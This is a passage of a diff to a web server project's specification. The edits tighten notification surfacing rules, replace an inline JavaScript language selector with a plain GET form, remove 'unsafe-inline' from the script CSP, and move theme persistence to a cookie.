-| **Server** | SSL expiring, updates available, disk space | All ON | Yes |
-| **Backup** | Backup complete, backup failed | Failed ON, Complete OFF | Yes |
-| **Scheduler** | Task failed, task manual run | Failed ON | Yes |
+**No UI toggles — operator notification preferences ARE the config file. Per-event email switches live under `server.notifications.email.events` (below); log output follows the global logging configuration.**
 
 ## Configuration
 
 ```yaml
 server:
+  # Site-wide announcement banners are configured under web.announcements (see "Announcements")
+  # and rendered server-side after <body>, before <main> — see PART 16 → "Site Banner"
+
   notifications:
-    # WebUI notifications (always enabled)
+    # Public WebUI toasts (client-side, visitor-facing only)
     webui:
       position: top-right
       # top-right, top-left, bottom-right, bottom-left
@@ -29207,10 +29138,10 @@ server:
 | `auto_install: false` (default) | Notify only — fires the `update_available` event; never touches the binary |
 | `auto_install: true` | Runs the full `--update yes` flow during the task run — eligible releases only |
 
-**Surfacing rules (API projects have no admin UI — only the operator WebUI):**
+**Surfacing rules (API projects have no admin UI — operator events never render in the public WebUI):**
 
-- "Update available" surfaces ONLY to operators: Banner + Notification Center in the operator WebUI (see "Operator Notifications"), plus the `update_available` email event (off by default) and a WARN log line
-- Fires once per version — emitted when a new eligible version is first seen, not re-sent on every task run; dismissing suppresses that version only
+- "Update available" surfaces ONLY to operators: a WARN log line, the `update_available` email event (off by default), and `--update check` / `--status` CLI output (see "Operator Notifications", PART 17)
+- Fires once per version — the WARN log and email are emitted when a new eligible version is first seen, not re-sent on every task run
 - NEVER inject update notices into API responses, headers, or any public endpoint — running-version and update status are Tier 3 information (Public Endpoint Safety Principle, PART 11), and update prompts are operator concerns, not client concerns
 
 ## Self-Update Implementation
@@ -37547,12 +37478,17 @@ func LanguageMiddleware(next http.Handler) http.Handler {
 **Language selector UI (in header/footer):**
 
 ```html
-<select onchange="window.location.search='?lang='+this.value" aria-label="{{t .Lang `common.select_language`}}">
-  {{range .AvailableLanguages}}
-    <option value="{{.Code}}" {{if eq .Code $.Lang}}selected{{end}}>{{.NativeName}}</option>
-  {{end}}
-</select>
+<form method="get" action="">
+  <select name="lang" aria-label="{{t .Lang `common.select_language`}}">
+    {{range .AvailableLanguages}}
+      <option value="{{.Code}}" {{if eq .Code $.Lang}}selected{{end}}>{{.NativeName}}</option>
+    {{end}}
+  </select>
+  <button type="submit">Go</button>
+</form>
 ```
+
+The selector is a plain GET form — the server already handles `?lang=`, so switching languages works with zero JavaScript. As progressive enhancement, external JS may auto-submit the form on `change` and hide the Go button (bound via `addEventListener` in an external file — never inline, the CSP blocks inline event handlers).
 
 **Shareable links:** Users can share `https://example.com/page?lang=fr` to force French for the recipient. After the first visit, the cookie persists and `?lang=` is no longer needed.
 
@@ -42652,7 +42588,7 @@ func BuildAPIURL(baseURL, path string, pathParams map[string]string, queryParams
 }
 
 // EncodePathSegment encodes a single path segment
-// Use for: usernames, org names, resource IDs, filenames
+// Use for: slugs, resource IDs, filenames
 func EncodePathSegment(segment string) string {
     return url.PathEscape(segment)
 }
@@ -44026,7 +43962,7 @@ make docker
 - [ ] Theme system: light, dark, auto
 - [ ] Dark theme is DEFAULT
 - [ ] Theme toggle in UI
-- [ ] Theme persisted in localStorage
+- [ ] Theme persisted in the `theme` cookie (server renders the class on `<html>`)
 - [ ] NO inline CSS - external stylesheets only
 - [ ] NO JavaScript alerts - toast notifications
 - [ ] Mobile-first responsive design
@@ -44265,7 +44201,7 @@ make docker
 
 ### Security Headers
 
-- [ ] Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
+- [ ] Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
 - [ ] X-Frame-Options: SAMEORIGIN
 - [ ] X-Content-Type-Options: nosniff
 - [ ] X-XSS-Protection: 1; mode=block
@@ -44590,7 +44526,7 @@ make docker
 - [ ] Dark theme is DEFAULT
 - [ ] Light theme available
 - [ ] Auto theme (system preference)
-- [ ] Theme persisted in localStorage
+- [ ] Theme persisted in the `theme` cookie (server renders the class on `<html>`)
 - [ ] Theme toggle in UI
 - [ ] Same theme system everywhere
 
